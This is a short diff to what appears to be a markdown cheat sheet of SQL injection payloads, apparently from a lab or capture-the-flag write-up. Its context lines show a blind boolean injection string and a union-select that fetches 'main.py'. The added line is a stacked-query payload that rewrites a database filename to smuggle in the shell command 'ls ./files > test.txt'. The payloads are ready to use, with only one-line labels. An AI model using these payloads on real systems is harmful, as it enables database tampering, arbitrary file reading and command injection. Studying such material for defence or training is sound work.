@@ -36,6 +36,8 @@ xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
 
 -1337 union select "main.py" >> To fetch arbitrary file.
 
+id=3;update photos set filename="*|| ls ./files > test.txt" where id =3;commit; >> To manipulate database filename.
+
 ```
 ### Determinig SQLi Vulnerablity & Login Bypass
 ```sql
